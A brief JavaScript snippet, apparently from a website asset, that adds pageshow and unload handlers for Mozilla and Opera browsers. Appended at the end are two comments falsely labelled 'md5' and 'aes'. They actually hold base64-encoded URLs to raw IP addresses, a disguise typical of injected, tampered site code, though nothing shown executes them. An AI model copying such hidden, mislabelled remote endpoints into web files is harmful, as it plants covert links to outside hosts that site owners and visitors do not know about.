if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzEyMC41NS4xNjcuMTQ2L2FwcC8/aGFzaD0xNTg1MjM1ODI5NjA1**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/